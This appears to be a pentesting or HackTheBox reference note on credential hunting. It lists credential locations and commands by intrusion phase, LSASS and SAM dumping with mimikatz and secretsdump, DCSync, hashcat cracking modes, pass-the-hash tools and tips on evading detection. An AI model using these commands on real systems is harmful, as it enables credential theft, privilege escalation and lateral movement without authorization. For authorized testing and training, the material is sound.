# Credential Hunting Logic

> Almost every HTB chain (and most pentests) is fundamentally a credential
> hunting exercise. The technical exploits are bridges between credential
> discoveries.

## Where credentials live, by phase

### Phase: External (no shell)

| Location | Command |
|---|---|
| Web page comments / source | `curl -s http://<ip>/ | grep -iE "pass|user|admin|@"` |
| `/robots.txt` paths | manual |
| Anonymous SMB shares | `smbmap -H <ip>`; `smbclient //<ip>/<share> -N` |
| LDAP `description` fields | `ldapsearch ... description` |
| FTP anon dumps | `mget *` |
| Banner versions of mail / DBs | record everything |
| Public GitHub / pastebin (real engagements) | OSINT |

### Phase: First shell (low-priv user)

| Location | Linux | Windows |
|---|---|---|
| Shell history | `~/.bash_history` `~/.zsh_history` `~/.mysql_history` `~/.psql_history` | `C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` |
| App config | `/etc/*` `/var/www/*/wp-config.php` `/opt/*/config*` `.env` | `C:\inetpub\wwwroot\web.config` `C:\Program Files\<app>\*.config` `appsettings.json` |
| User profile | `~/.aws/credentials` `~/.azure/` `~/.kube/config` `~/.git-credentials` `~/.netrc` `~/.gnupg/` | `C:\Users\<u>\AppData\Local\` `\Roaming\` |
| Backup files | `find / -name "*.bak" 2>/dev/null` | `Get-ChildItem -Recurse -Include *.bak,*.old` |
| Database files | `find / -name "*.kdbx" -o -name "*.kdb" 2>/dev/null` (KeePass) | same plus `*.pfx`, `*.pvk` |
| Sysprep / unattended | n/a | `C:\Windows\Panther\*` `C:\Windows\System32\sysprep\*` |
| Registry autologon | n/a | `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"` |
| GPP cpassword | n/a (but on DC SYSVOL: `/var/lib/samba/sysvol/.../Groups.xml`) | `\\<dc>\SYSVOL\<domain>\Policies\*\Groups.xml` |

### Phase: Local-admin / SYSTEM / root

| Location | Linux | Windows |
|---|---|---|
| Hashes | `/etc/shadow` | `secretsdump LOCAL` from SAM/SYSTEM/SECURITY |
| LSA secrets | n/a | `secretsdump.py` against the live host |
| LSASS dump | n/a | `mimikatz sekurlsa::logonpasswords`; `procdump -ma lsass.exe` |
| Browser-stored | varies | `Mimikatz dpapi`; SharpChrome / SharpEDGE |
| KeePass with master | `kpcli` `keepass2john` | same |
| SSH keys | `~/.ssh/id_*` `/etc/ssh/ssh_host_*` | `~/.ssh/`, `C:\ProgramData\ssh\` |
| Connection strings in DB | dump `users` tables, `secrets` tables | same |

### Phase: Domain admin

- DCSync via `secretsdump`: every account hash, optionally including
  current and old passwords.
- NTDS.dit on disk for offline analysis.
- LAPS passwords (machine local admin) via `LAPSDumper` / LDAP query.

## Generic credential-grep recipes

```bash
# Linux — broad regex sweep
grep -RinE "(pass|pwd|secret|key|token|api[_-]?key|connection[_-]?string)\s*[:=]" \
  /etc /opt /home /var/www 2>/dev/null

# Windows
findstr /si /m "password connectionString" *.config *.xml *.txt *.ini *.json
```

The signal-to-noise ratio is bad. Use it as a *firehose* and visually
filter. Pay attention to:
- File names containing `prod`, `live`, `prd`, `admin`, `service`.
- File names that look auto-generated (`Unattend.xml`, `appsettings.*.json`).
- Files with restrictive permissions you can read anyway.

## Credential reuse — the universal multiplier

Every credential found should immediately be tried against:

1. Every other user on this box (`su <user>` / `runas`).
2. Every service on this box (SSH, RDP, SMB, WinRM, MSSQL, MySQL, web
   admin pages).
3. Every other host on the network (post-pivot).
4. The same user on this box with prefix/suffix mutation (`Welcome1` →
   `Welcome1!`, `Welcome2`, `Welcome2024`).

OpenAdmin is the textbook example: an Open**Net**Admin DB password
(`n1nj4WarR10R!`) reused for the system account `jimmy`.

## Cracking workflow

```bash
# 1. Identify the hash format
hashid <hash>
# or
hash-identifier

# 2. Pick the right hashcat mode
# common modes:
#   1000  NTLM
#   1800  sha512crypt   ($6$...)
#   3200  bcrypt        ($2*$...)
#   13100 Kerberoast TGS
#   18200 AS-REP
#   17500 7-Zip / 7z   (depends)
#   13400 KeePass
#   1400  SHA256
#   100   SHA1
#   0     MD5

# 3. Always start with rockyou + best64 rules; expand only if it fails
hashcat -m <mode> hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 4. If that fails, try Kaonashi or HashesOrg2019 wordlists
# 5. If that fails, mask attack with hashcat -a 3 with derived patterns
```

When the hash uses an unusual cipher (KeePass, custom .NET):
- For KeePass: `keepass2john Database.kdbx > kp.hash`; `hashcat -m 13400`.
- For custom .NET (Cascade): reverse the cipher locally; do not try to
  crack — it's almost always a deterministic AES with a known key.

## Don't crack what you don't have to

- NTLM hashes can be **passed**, not cracked: `evil-winrm -H`,
  `psexec -hashes`, `crackmapexec -H`.
- Kerberos tickets can be **replayed** without the password.
- AS-REP and Kerberoast hashes *do* need cracking if you want the
  cleartext password.

## OPSEC

- Cracking is local and silent.
- Reusing stolen creds is loud at the destination service (5xx auth-fail
  events).
- AS-REP and Kerberoast requests are loggable on the DC; expect detection
  at mature shops.
- LSASS dumping triggers EDR; on production, prefer DCSync.

## Real HTB examples

- **Active** — `Groups.xml` cpassword decrypted statically; reused for
  Kerberoast.
- **Sauna** — registry autologon credential reuse for DCSync via
  pre-existing service group.
- **OpenAdmin** — DB config file → password used as system account.
- **Cascade** — `LegacyAdmin` connection string → custom .NET cipher
  (reverse-engineer, not crack).
- **Forest** — `svc-alfresco` AS-REP cracked to cleartext.

## See also

- [07-ad-attack-chains.md](07-ad-attack-chains.md)
- [10-lateral-movement.md](10-lateral-movement.md)
- [../password-attacks/](../password-attacks/)
- [../tool-usage/hashcat.md](../tool-usage/hashcat.md)
